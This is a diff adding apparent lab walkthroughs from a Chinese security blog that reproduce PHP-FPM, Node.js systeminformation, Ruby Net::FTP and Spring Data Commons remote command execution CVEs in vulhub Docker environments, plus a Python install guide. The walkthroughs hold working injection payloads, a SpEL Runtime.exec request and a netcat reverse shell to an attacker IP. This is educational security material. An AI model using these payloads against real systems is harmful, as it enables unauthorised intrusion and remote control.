@@ -127,6 +127,171 @@
       </categories>
   </entry>
   <entry>
+    <title>PHP-FPM远程命令执行(CVE-2019-11043)</title>
+    <url>/2021/12/21/PHP-FPM%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C(CVE-2019-11043)/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>漏洞主要由于 PHP-FPM 中 sapi/ fpm/ fpm/ fpm_main.c 文件内的 env_path_info 下溢导致，攻击者可以使用换行符 %0a 破坏 Nginx 中 fastcgi_split_path_info 对应的正则表达式，导致传递给 PHP-FPM 的 PATH_INFO 值为空，从而触发该漏洞，通过发送特制的URL请求，在一些特殊的配置情况下会导致任意代码执行。（当nginx配置不当时，会导致php-fpm远程任意代码执行。）</p>
+<p>参考链接：<a href="https://blog.csdn.net/weixin_40412037/article/details/111224046">https://blog.csdn.net/weixin_40412037/article/details/111224046</a></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>利用条件比较苛刻，如下图；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221171151237.png" alt="image-20211221171151237"></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. docker搭建；</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># centos 7</span></span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com.cnpmjs.org/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/php/CVE-2019-11043/</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221171918987.png" alt="image-20211221171918987"></p>
+<p>浏览器访问：<a href="http://192.168.220.132:8080/">http://192.168.220.132:8080</a></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221172927672.png" alt="image-20211221172927672"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在kali中安装go环境；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt</span><br><span class="line">wget https://dl.google.com/go/go1.13.3.linux-amd64.tar.gz</span><br><span class="line">tar zxvf go1.13.3.linux-amd64.tar.gz</span><br><span class="line"><span class="comment"># 配置go 环境变量</span></span><br><span class="line"><span class="built_in">export</span> GOROOT=/opt/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=/home/go/work</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin:<span class="variable">$GOPATH</span>/bin</span><br><span class="line"><span class="comment"># 新建go 工作目录</span></span><br><span class="line">mkdir -p /home/go/work</span><br></pre></td></tr></table></figure>
+
+<p>在kali中下载攻击脚本；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://hub.fastgit.org/neex/phuip-fpizdam.git</span><br></pre></td></tr></table></figure>
+
+<p>更换为国内源；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br><span class="line">go env -w GO111MODULE=on</span><br></pre></td></tr></table></figure>
+
+<p>生成exp;</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> phuip-fpizdam</span><br><span class="line">go get -v</span><br><span class="line">go build</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221173602341.png" alt="image-20211221173602341"></p>
+<p>在kali的phuip-fpizdam目录下执行；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./phuip-fpizdam http://192.168.220.132:8080/index.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>用浏览器访问：<a href="http://192.168.220.132:8080/?a=id">http://192.168.220.132:8080?a=id</a></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221173755066.png" alt="image-20211221173755066"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>首先，bash反弹shell肯定是不能成功的~</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221192413253.png" alt="image-20211221192413253"></p>
+<p>所以，只能祈祷靶机中装有netcat。在docker中，进入到php:7.2.10-fpm环境，安装netcat，操作如下；</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@localhost CVE-2019-11043]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE            COMMAND                  CREATED       STATUS       PORTS                                   NAMES</span><br><span class="line">96dbfccbc89d   nginx:1          &quot;/docker-entrypoint.…&quot;   2 hours ago   Up 2 hours   0.0.0.0:8080-&gt;80/tcp, :::8080-&gt;80/tcp   cve-2019-11043_nginx_1</span><br><span class="line">c0ba394f3326   php:7.2.10-fpm   &quot;docker-php-entrypoi…&quot;   2 hours ago   Up 2 hours   9000/tcp                                cve-2019-11043_php_1</span><br><span class="line">[root@localhost CVE-2019-11043]# docker exec -it c0b /bin/bash</span><br><span class="line">root@96dbfccbc89d:/# apt-get updata</span><br><span class="line">root@96dbfccbc89d:/# apt-get install netcat</span><br></pre></td></tr></table></figure>
+
+<p>之后，在攻击机中率先执行<code>nc -lvvp 2333</code>，浏览器再访问<code>http://192.168.220.132:8080/?a=nc -e /bin/bash 192.168.220.138 2333</code></p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221192946623.png" alt="image-20211221192946623"></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Node.js命令注入漏洞(CVE-2021-21315)</title>
+    <url>/2021/12/21/Node.js%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2021-21315)/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p> Node.js-systeminformation是用于获取各种系统信息的Node.JS模块,它包含多种轻量级功能，可以检索详细的硬件和系统相关信息。<br>      2021年02月24日，npm团队发布安全公告，Node.js库中的systeminformation软件包中存在一个命令注入漏洞CVE-2021-21315，攻击者可以通过在未经过滤的参数中注入Payload来执行系统命令，最终获取服务器最高权限。</p>
+<p>参考链接：<a href="https://blog.csdn.net/weixin_43867542/article/details/118890815">https://blog.csdn.net/weixin_43867542/article/details/118890815</a></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Systeminformation &lt; 5.3.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. Linux搭建；</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nodejs安装</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /opt/</span><br><span class="line">Wget https://nodejs.org/dist/v12.18.4/node-v12.18.4-linux-x64.tar.xz</span><br><span class="line">tar -xvf node-v12.18.4-linux-x64.tar.xz</span><br><span class="line">mv node-v12.18.4-linux-x64 nodejs</span><br><span class="line">sudo mv nodejs/ /usr/<span class="built_in">local</span>/sbin/</span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/sbin/nodejs/bin/node /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/sbin/nodejs/bin/npm /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221140116127.png" alt="image-20211221140116127"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># POC下载</span></span><br><span class="line">git <span class="built_in">clone</span> git://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC</span><br><span class="line"></span><br><span class="line"><span class="comment"># nodejs启动http漏洞环境</span></span><br><span class="line"><span class="built_in">cd</span> /opt/CVE-2021-21315-PoC/</span><br><span class="line">node index.js</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221140302776.png" alt="image-20211221140302776"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>浏览器访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.220.131:8000/api/getServices?name[]=$(pstree -ah &gt; 1.txt)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221142914760.png" alt="image-20211221142914760">回到docke</p>
+<p>返回到靶机，查看poc是否执行成功；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211221143032830.png" alt="image-20211221143032830"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
+<li>建议将 systeminformation 及时升级到 5.3.1 或更高版本</li>
+</ul>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Ruby FTP远程命令执行漏洞(CVE-2017-17405)</title>
+    <url>/2021/12/20/Ruby%20FTP%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-17405)%20/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>Ruby Net::FTP 模块是一个FTP客户端，在上传和下载文件的过程中，打开本地文件时使用了<code>open</code>函数。而在ruby中，<code>open</code>函数是借用系统命令来打开文件，且没用过滤shell字符，导致在用户控制文件名的情况下，将可以注入任意命令。</p>
+<p>参考链接：<a href="https://www.freesion.com/article/6038551166/">https://www.freesion.com/article/6038551166/</a></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ruby &lt; 2.4.3</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. docker搭建；</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/ruby/CVE-2017-14015</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>访问 <a href="http://xxx.xxx.xxx.xxx:8080/">http://xxx.xxx.xxx.xxx:8080/</a> 正常即可;</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220151506322.png" alt="image-20211220151506322"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在攻击机中运行一个可以访问到的FTP客户端。可以使用python运行pyftpdlib，如果没有对应环境安装就好了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#安装pyftplid</span><br><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line">#在当前目录下使用python生成一个ftp服务器，默认监听在0.0.0.0:2121端口。</span><br><span class="line">python -m pyftpdlib -p 2121 -i 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220175349821.png" alt="image-20211220175349821"></p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>使用burp抓取流量包，注入命令<code>|touch$&#123;IFS&#125;success.txt</code>（空格用<code>$&#123;IFS&#125;</code>代替），发送如下数据包即可；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /download?uri=ftp://192.168.220.132:2121/&amp;file=|ping$&#123;IFS&#125;8.8.8.8 HTTP/1.1</span><br><span class="line">Host: 192.168.220.132:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220175653175.png" alt="image-20211220175653175"></p>
+<p>返回到容器中可查看到命令执行成功；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220185614487.png" alt="image-20211220185614487"></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>安装python3环境</title>
+    <url>/2021/12/20/%E5%AE%89%E8%A3%85python%E7%8E%AF%E5%A2%83%20/</url>
+    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
+<p>本着帮助大家（自己）快速解决问题，节约时间的原则，这一篇还是记录一下安装python3环境。</p>
+<p>参考：<a href="https://blog.csdn.net/weixin_41244495/article/details/109426093">https://blog.csdn.net/weixin_41244495/article/details/109426093</a></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="Linux安装"><a href="#Linux安装" class="headerlink" title="Linux安装"></a>Linux安装</h2><h4 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h4><p>centos7 安装 python3和pip3的<code>sh</code>脚本如下。利用跑脚本的时间去烧水、泡茶先~</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.1/Python-3.7.1.tgz</span><br><span class="line">mkdir -p /usr/<span class="built_in">local</span>/python3</span><br><span class="line">tar -zxvf Python-3.7.1.tgz </span><br><span class="line">yum install gcc</span><br><span class="line">yum install libffi-devel -y</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.1</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/python3  </span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">/usr/<span class="built_in">local</span>/python3/bin/python3.7</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/python3/bin/python3 /usr/bin/python3</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/python3/bin/pip3 /usr/bin/pip3</span><br><span class="line">vim /etc/profile</span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br><span class="line">python3 -V</span><br><span class="line">pip3 -V</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220140633631.png" alt="image-20211220140633631"></p>
+]]></content>
+      <categories>
+        <category>安全运维</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SpringDataCommons远程命令执行漏洞(CVE-2018-1273)</title>
+    <url>/2021/12/20/SpringDataCommons%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2018-1273)/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
+<p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
+<p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p>
+<p>参考链接：<a href="https://xz.aliyun.com/t/2252">https://xz.aliyun.com/t/2252</a></p>
+<hr>
+<span id="more"></span>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</span><br><span class="line">Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</span><br><span class="line">Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</span><br><span class="line">Spring Data REST 3.0 - 3.0.5 (Kay SR5)</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>1. docker搭建；</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /app/vulhub-master/spring/CVE-2018-1273</span><br><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>访问 <a href="http://xxx.xxx.xxx.xxx:8080/users">http://xxx.xxx.xxx.xxx:8080/users</a> 正常即可;</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220102734746.png" alt="image-20211220102734746"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>浏览器打开<a href="http://127.0.0.1:8080/users">http://127.0.0.1:8080/users</a></p>
+<p>开启burp拦截流量数据，数据包如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /users?page=&amp;size=5 HTTP/1.1</span><br><span class="line">Host: 192.168.77.211:56976</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 120</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: http://localhost:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://localhost:8080/users?page=0&amp;size=5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"></span><br><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;ping 8.8.8.8&quot;)]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></table></figure>
+
+<p>点击发送；</p>
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220103025579.png" alt="image-20211220103025579"></p>
+<p>进入到docker容器，使用<code>ps -ef</code>命令查看<code>ping</code>命令是否有执行成功；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it  &lt;id&gt; /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211220103134849.png" alt="image-20211220103134849"></p>
+]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>MySQL反弹shell提权</title>
     <url>/2021/12/10/MySQL%E5%8F%8D%E5%BC%B9shell%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
@@ -654,7 +819,7 @@
       </categories>
   </entry>
   <entry>
-    <title>Adobe ColdFusion 反序列化漏洞(CVE-2017-3066)</title>
+    <title>AdobeColdFusion 反序列化漏洞(CVE-2017-3066)</title>
     <url>/2021/11/12/Adobe%20ColdFusion%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2017-3066)/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
 <p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
@@ -760,7 +925,7 @@
       </categories>
   </entry>
   <entry>
-    <title>Django JSONField SQL注入漏洞(CVE-2019-14234&amp;CVE-2019-9193)</title>
+    <title>DjangoJSONFieldSQL注入漏洞(CVE-2019-14234&amp;CVE-2019-9193)</title>
     <url>/2021/11/11/Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2019-14234&amp;CVE-2019-9193)/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
 <p><strong>声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</strong></p>
